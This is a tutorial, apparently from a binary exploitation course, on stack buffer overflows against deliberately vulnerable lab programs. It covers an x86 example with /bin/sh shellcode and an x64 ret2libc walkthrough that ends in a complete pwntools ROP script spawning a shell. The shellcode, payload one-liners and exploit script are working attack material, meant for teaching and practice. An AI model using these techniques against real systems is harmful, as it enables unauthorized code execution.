# Exploitation


## Buffer Overflow

### What it is
A **buffer overflow** happens when a program copies more data into a buffer than it can store.
If the buffer is on the stack, the extra bytes can overwrite important data like the **saved return address**.


### Example 1: x86 overflow

With this example:  
  
```
void callit (char *name) {
	int value;
	char buffer[500];
	
	value = 0;	
	strcpy (buffer, name);
	printf ("-------------------\n");
	printf ("Value : \t%p [%d]\n", &value, value);	
	printf ("Buffer in: \t%p\n", buffer);
	printf ("Address of function success2: %p\n", success2); 	
	printf ("-------------------\n");
	if (value==3) {
		 success();
	}
	else {
		printf ("[!] No success\n"); 
	}
	value = 0; 
}

``` 
Goal: get value == 3.

1) Change the value of the variable "value" to 3:
```
./vuln `perl -e 'print "A"x500 . "\x03"'` 
```

2) Execute the function success2. Find the value of the pointer to the function success2 using gdb:

    `(gdb) print success2`
	      
	` $1 = {int ()} 0x8049339 <success2>0x8049339`

3) Find the position of the Saved EIP with gdb --> offset of 516 bytes. Compute the offset:

  ``` 
    gdb -q vuln 
    break callit
	run AAAA
    print $rbp or $ebp
    x/x buffer
    offset = print /d <rbp> - <buf> + 8(64)/4(32)
	----------------
	gef➤  print $ebp
	$1 = (void *) 0xffffce48
	gef➤  x/x buffer
	0xffffcc48:     0x00000007
	gef➤  print /d 0xffffce48-0xffffcc48+4
	$2 = 516
  ```

4) Overflow the Saved EIP.
``` 
    ./vuln `perl -e 'print "A"x500 . "B"x16 . "\x39\x93\x04\x08"'`

    ./vuln $(python -c 'import sys; sys.stdout.buffer.write (b"A"*500 + b"B"*16 + b"\x39\x93\x04\x08")')
```

5) Execute a shellcode that launches /bin/sh:

    Shellcode (25 bytes): execve("/bin/sh", ["/bin/sh"], 0)
    In hex: `"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"`
       
- Without NOP Sled: 
```
./vuln `perl -e 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x475 . "\x03" . "B"x15 . "\x78\xca\xff\xff" '`  
``` 
"A"x475 -> buffer size = 500 // shellcode size = 25 // 500-25=475 fill until the buffer is full

x03 -> value==3

"B"x15 -> fill the buffer = 500 // write x03 = 1 // 500+1=501 // offset = 516 // 516-501=15

\x78\xca\xff\xff -> dir we want to add in the return address

``` 
./vuln $(python -c 'import sys; sys.stdout.buffer.write (b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + b"A"*475 + b"\x03" + b"B"*15 + b"\x78\xca\xff\xff")')
```

- With NOP Sled

	   ./vuln `perl -e 'print "\x90"x70 . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x405 . "\x03" . "B"x15 . "\x78\xca\xff\xff" '`'

### Example 2: x64 overflow

Example code:

```c
#include<stdio.h> 
#include<string.h> 

void vuln(char *cadena)
{ 
  char buf[100]; 
  strcpy(buf,cadena); 
  printf("Input was: %s\n",buf); 
}
void main(int argc, char *argv[]) 
{
  vuln(argv[1]);
}
```
The offset is 120 bytes.


#### Searching for Addresses in libc

We need to find the addresses to execute `system ("/bin/sh")`. Since our executable does not contain the call, we inspect libc:

```bash
# ldd vuln
        linux-vdso.so.1 (0x00007ffff7ffd000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7e14000)
        /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)


# objdump -M intel -d /lib/x86_64-linux-gnu/libc.so.6 > dump  # Dump the disassembly (Intel format) into the file dump

# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh  # Search for /bin/sh and find it at offset 0x183cee

 1a7e43 /bin/sh
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/bufferoverflow/exercises/stackOverflow/x64]
└─$ cat dump | grep system        
00000000000528f0 <__libc_system@@GLIBC_PRIVATE>:
   528f3:       74 0b                   je     52900 <__libc_system@@GLIBC_PRIVATE+0x10>
0000000000156030 <svcerr_systemerr@GLIBC_2.2.5>:
  156087:       75 05                   jne    15608e <svcerr_systemerr@GLIBC_2.2.5+0x5e>

```

We note the following offsets:

`system:  0x528f0`

`/bin/sh: 0x1a7e43`

Now we add these offsets to the base address where LIBC is loaded (we check it with gdb, since it will not change because ASLR is disabled):

```
root@kali:~/bufferOverflow/stackOverflow/x64# gdb -q vuln
Reading symbols from vuln...done.
gef➤ b main 
Breakpoint 1 at 0x1154: file vuln.c, line 7.
gef➤ run
gef➤  vmmap
[ Legend:  Code | Stack | Heap ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x00007ffff7daf000 0x00007ffff7db2000 0x0000000000000000 rw- 
0x00007ffff7db2000 0x00007ffff7dda000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7dda000 0x00007ffff7f3f000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f3f000 0x00007ffff7f95000 0x000000000018d000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f95000 0x00007ffff7f99000 0x00000000001e2000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f99000 0x00007ffff7f9b000 0x00000000001e6000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9b000 0x00007ffff7fa8000 0x0000000000000000 rw- 
0x00007ffff7fc0000 0x00007ffff7fc2000 0x0000000000000000 rw- 
0x00007ffff7fc2000 0x00007ffff7fc6000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc6000 0x00007ffff7fc8000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc8000 0x00007ffff7fc9000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fc9000 0x00007ffff7ff0000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ff0000 0x00007ffff7ffb000 0x0000000000028000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000033000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000035000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]

```


Libc load address:

`libc_base = 0x00007ffff7db2000`

### Finding a Gadget

Finally, we need to find a gadget to load the appropriate parameter into RDI for calling `system`.

Let's use ropper (it's in the install script in the repository):

Now we search for gadgets that are useful for loading the value of `/bin/sh` into RDI:

```
┌──(kali㉿kali)-[~/bufferoverflow/exercises/stackOverflow/x64]
└─$ ropper --file libc.so.6 --nocolor | grep ret | grep -E "pop rdi; ret"                                  
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x000000000002a205: pop rdi; ret;
```

Therefore, we have the offset of the gadget we are looking for:

`offset_pop_rdi = 0x2a205`

### Exploit Development

```python
#!/usr/bin/python3
# coding: utf-8

from pwn import *

# definimos variables 
libc_base = 0x00007ffff7dd9000
system_addr = libc_base + 0x528f0
binsh_addr = libc_base + 0x1a7e43
pop_rdi_ret = libc_base + 0x2a205
ret = libc_base + 0x2a206 # el valor de todo (pop + ret) es 205, entonces para obtener el valor de ret, debo sumarle uno a 205.


log.info ("system: " + str(hex(system_addr)))
log.info ("binsh: " + str(hex(binsh_addr)))
log.info ("pop_rdi_ret: " + str(hex(pop_rdi_ret)))

pause()

p = process ("./vuln")

# build the stack
# we need the offset. el offset es el 120. overflow con 120 As.
payload = b""
payload += b"A"*120
# Some functions (e.g., moveaps) require RSP to be aligned to 16 bits. For this reason, since 120 "A"s mean
# that RSP is not aligned to 16 bits (missing 8 bits --> 120/16 = 7.5), here we add a ret instruction
# (which takes 8 bits), so that the stack is aligned to 16 bits (last byte is 0 when calling system)
payload += p64 (ret) # el ret no hace nada. aqui se pone el ret porque cuando llamo a una funcion necesito que este alineada a 16B. como no lo esta necesito quitar los 8B
payload += p64(pop_rdi_ret) # finding a gadget. Estos gadget cogen de la libc. como? mirar la explicacion en el repo
payload += p64(binsh_addr)
payload += p64(system_addr)
	
log.info ("Sending payload...")

p.sendline(payload)
p.recv()
p.interactive()

```










